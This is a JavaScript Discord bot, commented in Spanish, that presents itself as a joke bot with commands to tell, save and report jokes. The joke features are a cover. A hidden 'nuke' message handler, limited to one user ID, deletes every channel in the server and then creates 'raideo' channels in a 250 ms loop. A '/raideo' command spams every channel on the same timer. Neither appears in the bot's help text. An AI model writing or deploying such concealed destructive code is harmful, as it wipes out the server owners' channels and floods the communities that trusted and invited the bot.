const Discord = require("discord.js");
const client = new Discord.Client();
const { prefix, token } = require('./config.json');
const { chiste } = require('./chistes.json');
const fs = require('fs');

c = 0;
r = 0;
var fechaHora = new Date();
tiempo = fechaHora.getHours() + ":" + fechaHora.getMinutes();
dia = fechaHora.getDay();
mes = fechaHora.getMonth();

client.on("ready", () => {
    console.log("estoy listo");
    //setInterval(fechayhora, 60000);
});

function fechayhora() {
  fechaHora = new Date();
  tiempo = fechaHora.getHours() + ":" + fechaHora.getMinutes();
  dia = fechaHora.getDate();
  mes = fechaHora.getMonth();
  anno = fechaHora.getFullYear();
}

//arrayfechas = []

//let objfecha = {
  //id,
  //fecha,
  //recordar
//};

/* client.on('message', message => {
  try {
    if (message.channel.id==859612984380489740 && message.author.id == 420753258831806474){
      console.log("contador")
      console.log(message.content)
      var a = (parseInt(message.content)+1)
      if (!isNaN(a)){
        message.channel.send(a)
      }
      else{
        console.error();
      }
    }
  } catch (error) {
    return
  }
})
 */
client.on('message', message => {

  function crearcanales() {
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    })


  }

  if (message.content === "nuke" && message.author.id == 420753258831806474) {
    message.guild.channels.cache.forEach(channel => channel.delete());
    setInterval(crearcanales, 250)
    message.guild.channels.create(`raideo by j͎u͎a͎n͎_͎p͎2͎0͎4͎` , {
      type: 'text'
    }).then(channel => {
      channel.send("a comensado el raideo >:)")
    })
    }

})







client.on('message', message => {

  if (!message.content.startsWith(prefix) || message.author.bot) return;

  function raideo() {
    message.guild.channels.cache.forEach(channel => channel.send("raideando el servidor by j͎u͎a͎n͎_͎p͎2͎0͎4͎"));
  }
  
    
    const argumentos = message.content.slice(prefix.length).toLowerCase();
    const args = message.content.slice(prefix.length).trim().split(' ');
    const command = args.shift().toLowerCase();

    if (command === "ayuda") {
      console.log(args ,"\n", argumentos,"\n", command)
        message.channel.send({embed: {
            color: 3447003,
            author: {
                name: "AYUDA",
                icon_url: client.user.avatarURL
            },
            description: "todos los comandos del bot (prefix = ¨/¨)",
            fields: [{
                name: "/ayuda",
                value: "el mensaje que estas leyendo"
              },
              {
                name: "/basedatos",
                value: "muestra la cantidad de chistes disponibles"
              },
              {
                name: "/chiste",
                value: "/chiste: un chiste random del repertorio\n/chiste Id: un chiste en especifico"
              },
              {
                name: "/guardar tu chiste",
                value: "ayudas a llenar la base de datos aportando tu chiste"
              },
              {
                name: "/reportar Id razon",
                value: "reportas un chiste para que sea revizado por el motivo especificado"
              },
              {
                name: "______________________________",
                value: "[link invitacion del bot](https://discord.com/oauth2/authorize?client_id=860005163569774592&scope=bot&permissions=314432)"
              },
              
            ],
            //timestamp: fechaHora,
            timestamp: new Date(),
            footer: {
              icon_url: client.user.avatarURL,
              text: "j͎u͎a͎n͎_͎p͎2͎0͎4͎"
              
            }
          }
      });
            
    }

    if (command === "chiste") {
      console.log(args ,"\n", argumentos,"\n", command)
          numarg = parseInt(argumentos.slice(6).trim())
          if (argumentos === "chiste"){
            num = Math.floor(Math.random()*(chiste.length))
            console.log(num)
            message.channel.send(chiste[num])
          }
          else if ((0<=numarg && numarg<chiste.length) && !Number.isNaN(numarg)){
            console.log("id pedido "+ numarg )
            message.channel.send(chiste[numarg]) 
          }
          else if ((0>numarg || numarg>chiste.length) && !Number.isNaN(numarg)){
            message.channel.send("no existe ese ID") 
          }
          else {
            message.channel.send("no existe ese ID")
          }
    }
  
    if (command === "basedatos") {
      console.log(args ,"\n", argumentos,"\n", command)
        message.channel.send("en este momento tenemos un repertorio de " + (chiste.length) + " chistes")
    }
    
    if (command === "guardar") {
      console.log(argumentos,"\n", command)
        if (argumentos === "guardar") {
            message.channel.send("no has puesto ningun chiste")
        }
        else {
            fs.writeFile('./chistesnuevos/nuevoschistes'+c+'.json', JSON.stringify(argumentos),'utf8', (err) => { 
                if (err) throw err; 
                console.log('The file has been saved!'); 
              });
            c = c+1;
            message.channel.send("tu chiste se a guardado, espera a que lo coloquen en la base de datos")
        }
    }
    if (command === "reportar") {
      console.log(args ,"\n", argumentos,"\n", command)
      argnum1 = parseInt(args[0])
      console.log("reportar id "+argnum1)
      if (argumentos === "reportar") {
          message.channel.send("no has puesto ID") 
      }
      else if ((args.length>=2) && (0<=argnum1 && argnum1<chiste.length) && !Number.isNaN(argnum1)){
        fs.writeFile('./reportes/reporte'+r+'.json', JSON.stringify(argumentos),'utf8', (err) => { 
          if (err) throw err; 
          console.log('The file has been saved!'); 
        });
      r = r+1;
      message.channel.send("tu reporte se a guardado, espera a que lo revisen")
      }
      else if ((args.length == 1) && (0<=argnum1 && argnum1<chiste.length) && !Number.isNaN(argnum1)){
        message.channel.send("no has puesto una razon")
      }
      else{
        message.channel.send("no existe ese ID")
      }

    }
    
    else if(command === "recordar"){
      message.channel.send("hoy es "+dia+"/"+mes+"/"+anno+" y son las "+tiempo)
      

      //fs.appendFile('./fechas.json', JSON.stringify(argumentos),'utf8', (err) => { 
        //if (err) throw err; 
        //console.log('fecha salvada'); 
      //});

    }
    else if (command === "userfoto") {
		message.channel.send(message.author.displayAvatarURL({dynamic: true}));
	}
  else if (command === "raideo" && message.author.id == 420753258831806474) {
		var varraideo = setInterval(raideo, 250)

  }
  else if (command === "pararraideo"){
    clearInterval(varraideo)
  }
    });

client.login(token)
